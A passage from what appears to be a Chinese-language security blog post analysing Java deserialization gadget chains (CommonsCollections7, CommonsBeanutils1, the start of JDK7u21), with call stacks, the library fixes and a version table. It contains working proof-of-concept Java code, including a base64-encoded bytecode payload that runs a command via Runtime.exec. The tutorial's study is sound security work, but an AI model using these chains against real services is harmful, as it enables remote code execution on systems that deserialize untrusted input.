class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">equals:472, AbstractMap (java.util)</span><br><span class="line">equals:130, AbstractMapDecorator (org.apache.commons.collections.map)</span><br><span class="line">reconstitutionPut:1221, Hashtable (java.util)</span><br><span class="line">readObject:1195, Hashtable (java.util)</span><br><span class="line">...</span><br><span class="line">main:49, CommonsCollections7 (com.example)</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>Hashtable#put</code> 也会调用 <code>entry.key.equals</code> 方法导致利用链被触发一次，因此需要将调用 <code>LazyMap#get</code> 时加入的 <code>key</code> 去掉。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            <span class="type">V</span> <span class="variable">old</span> <span class="operator">=</span> entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外 <code>Hashtable#put</code> 调用的 <code>entry.key.equals</code> 需要返回 <code>false</code> 才能把第二个键值对放入 <code>Hashtable</code>。在 <code>AbstraceMap#equals</code> 中，如果 <code>value</code> 为 <code>null</code> 的话只需要让 <code>m.get(key)</code> 返回不为 <code>null</code> 即可。而 <code>transformer</code> 方法返回不为 <code>null</code> 很容易满足。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Entry&lt;K,V&gt; e = i.next();</span><br><span class="line"><span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line"><span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line"><span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h2><p>Apache Commons Collections 官方在 2015 年底得知序列化相关的问题后，就在两个分支上同时发布了新的版本 4.1 和 3.2.2。</p>
<p>3.2.2 版代码中增加了一个方法 <code>FunctorUtils#checkUnsafeSerialization</code>，用于检测反序列化是否安全。如果开发者没有设置全局配置 <code>org.apache.commons.collections.enableUnsafeSerialization=true</code>，即默认情况下会抛出异常。</p>
<p>这个检查在常见的危险 <code>Transformer</code> 类（<code>InstantiateTransformer</code>、<code>InvokerTransformer</code>、<code>PrototypeFactory</code>、<code>CloneTransformer</code> 等）的 <code>readObject</code> 里进行调用。所以，当我们反序列化包含这些对象时就会抛出一个异常：</p>
<p><code>Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property &#39;org.apache.commons.collections.enableUnsafeSerialization&#39; to &#39;true&#39;, but you must ensure that your application does not de-serialize objects from untrusted sources.</code></p>
<p>在 4.1 版本，这几个危险 <code>Transformer</code> 类不再实现 <code>Serializable</code> 接口，也就是说，他们几个彻底无法序列化和反序列化了。</p>
<table>
<thead>
<tr>
<th align="left">CommonsCollections Gadget Chains</th>
<th align="left">CommonsCollection Version</th>
<th align="left">JDK Version</th>
<th align="left">Note</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CommonsCollections1</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.7 （8u71之后已修复不可利用）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections2</td>
<td align="left">CommonsCollections 4.0</td>
<td align="left">暂无限制</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections3</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.7 （8u71之后已修复不可利用）</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections4</td>
<td align="left">CommonsCollections 4.0</td>
<td align="left">暂无限制</td>
<td align="left">javassist</td>
</tr>
<tr>
<td align="left">CommonsCollections5</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">1.8 8u76（实测8u181也可）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections6</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">暂无限制</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">CommonsCollections7</td>
<td align="left">CommonsCollections 3.1 - 3.2.1</td>
<td align="left">暂无限制</td>
<td align="left"></td>
</tr>
</tbody></table>
<h1 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h1><h2 id="CommonsBeanutils-概述"><a href="#CommonsBeanutils-概述" class="headerlink" title="CommonsBeanutils 概述"></a>CommonsBeanutils 概述</h2><p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为 JavaBean）的一些操作方法。</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>commons-beanutils 中提供了一个静态方法 PropertyUtils.getProperty，让使用者可以直接调用任意 JavaBean 的 getter 方法。例如下面这段代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Example</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Bean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bean</span>();</span><br><span class="line">        PropertyUtils.setProperty(bean, <span class="string">&quot;name&quot;</span>, <span class="string">&quot;Alice&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) PropertyUtils.getProperty(bean, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bean</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123; <span class="keyword">return</span> name; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123; <span class="built_in">this</span>.name = name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在执行 <code>PropertyUtils.getProperty(bean, &quot;name&quot;)</code> 时，commons-beanutils 会自动找到 <code>name</code> 属性的 getter 方法，也就是 getName，然后调用，获得返回值。</p>
<p>除此之外， <code>PropertyUtils.getProperty</code> 还支持递归获取属性，比如 <code>a</code> 对象中有属性 <code>b</code>，<code>b</code> 对象中有属性 <code>c</code>，我们可以通过 <code>PropertyUtils.getProperty(a, &quot;b.c&quot;);</code> 的方式进行递归获取。</p>
<p>通过这个方法，使用者可以很方便地调用任意对象的 getter，适用于在不确定 JavaBean 是哪个类对象时使用。</p>
<p>当然，commons-beanutils 中诸如此类的辅助方法还有很多，如调用 setter、拷贝属性等，这里不再细说。</p>
<h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><p>commons-beanutils 的 <code>org.apache.commons.beanutils.BeanComparator</code> 实现了 <code>java.util</code> 接口，它的 <code>compare</code> 方法会对待比较对象调用 <code>PropertyUtils.getProperty</code> 方法获取 <code>property</code> 属性。而 <code>TemplatesImpl#getOutputProperties</code> 可以触发字节码加载。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">( Object o1, Object o2 )</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( property == <span class="literal">null</span> ) &#123;</span><br><span class="line">        <span class="comment">// compare the actual objects</span></span><br><span class="line">        <span class="keyword">return</span> comparator.compare( o1, o2 );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty( o1, property );</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty( o2, property );</span><br><span class="line">        <span class="keyword">return</span> comparator.compare( value1, value2 );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( IllegalAccessException iae ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span> ( InvocationTargetException ite ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> ( NoSuchMethodException nsme ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>( <span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此我们可以借鉴 CC2 的思路在 <code>PriorityQueue</code> 中放两个 <code>TemplatesImpl</code> 并且设置 <code>BeanComparator</code> 为 <code>PriorityQueue</code> 的比较方式。此时如果我们设置 <code>BeanComparator</code> 的 <code>property</code> 属性为 <code>outputProperties</code> 则在反序列化触发 <code>BeanComparator#compare</code> 时会通过 <code>PropertyUtils.getProperty</code> 调用到 <code>TemplatesImpl#getOutputProperties</code> 进而实现任意字节码加载。</p>
<p>poc 如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAxTGNvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAUVGVzdFRyYW5zZm9ybWVyLmphdmEMAAoACwcAKAEAL2NvbS9leGFtcGxlL1Rlc3RUcmFuc2Zvcm1lciRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAbY29tL2V4YW1wbGUvVGVzdFRyYW5zZm9ybWVyAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAEY2FsYwgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQANU3RhY2tNYXBUYWJsZQEAHnlzb3NlcmlhbC9Qd25lcjU0MDQzOTYxNzA2NjcwMAEAIEx5c29zZXJpYWwvUHduZXI1NDA0Mzk2MTcwNjY3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAHAAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAIgAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAJwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(queue);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>调用栈如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">defineClass:142, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">defineTransletClasses:346, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getTransletInstance:383, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:418, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">...</span><br><span class="line">getProperty:426, PropertyUtils (org.apache.commons.beanutils)</span><br><span class="line">compare:157, BeanComparator (org.apache.commons.beanutils)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">...</span><br><span class="line">main:38, CommonsBeanutils1 (com.example)</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意 <code>BeanComparator</code> 的构造方法有两个，如果没有指定 <code>Comparator</code> 默认会使用 <code>org.apache.commons.collections.comparators.ComparableComparator</code>。这样改利用链会依赖于 commons-collections 库。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property )</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>( property, ComparableComparator.getInstance() );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">( String property, Comparator comparator )</span> &#123;</span><br><span class="line">    setProperty( property );</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>为了避免这种依赖关系从而提高利用链的通用性，我们需要找到一个类来替换 <code>ComparableComparator</code>，它需要满足下面这几个条件：</p>
<ul>
<li>实现 <code>java.util.Comparator</code> 接口</li>
<li>实现 <code>java.io.Serializable</code> 接口</li>
<li>Java、shiro 或 commons-beanutils 自带，且兼容性强。</li>
</ul>
<p>实际上有很多类都满足这个条件，这里我选择的是 <code>CaseInsensitiveComparator</code>，可以通过 <code>String.CASE_INSENSITIVE_ORDER</code>  获取。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/105e5cae598e4a888081c4dcf0b3919e.png"
                      alt="在这里插入图片描述"
                ></p>
<h1 id="原生反序列化利用链"><a href="#原生反序列化利用链" class="headerlink" title="原生反序列化利用链"></a>原生反序列化利用链</h1><p>主要是一些不依赖第三方库的 Java 反序列化利用链。</p>
<h2 id="JDK7u21"><a href="#JDK7u21" class="headerlink" title="JDK7u21"></a>JDK7u21</h2><p><code>AnnotationInvocationHandler</code> 类中的 <code>equalsImpl</code> 方法在参数 <code>Object o</code> 不是 <code>AnnotationInvocationHandler</code> 的实现类代理的对象时会获取 <code>AnnotationInvocationHandler#type</code> 中的所有方法，然后依次调用 <code>o</code> 中的这些方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> AnnotationInvocationHandler <span class="title function_">asOneOfUs</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (Proxy.isProxyClass(o.getClass())) &#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Proxy.getInvocationHandler(o);</span><br><span class="line">        <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> AnnotationInvocationHandler)</span><br><span class="line">            <span class="keyword">return</span> (AnnotationInvocationHandler) handler;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Method[] getMemberMethods() &#123;</span><br><span class="line">    <span class="keyword">if</span> (memberMethods == <span class="literal">null</span>) &#123;</span><br><span class="line">        memberMethods = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                    <span class="keyword">final</span> Method[] mm = type.getDeclaredMethods();</span><br><span class="line">                    validateAnnotationMethods(mm);</span><br><span class="line">                    AccessibleObject.setAccessible(mm, <span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">return</span> mm;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> memberMethods;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Method[] memberMethods = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!type.isInstance(o))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> memberMethod.getName();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ourValue</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">hisValue</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">AnnotationInvocationHandler</span> <span class="variable">hisHandler</span> <span class="operator">=</span> asOneOfUs(o);</span><br><span class="line">        <span class="keyword">if</span> (hisHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                hisValue = memberMethod.invoke(o); <span class="comment">// 调用 o 的所有方法</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        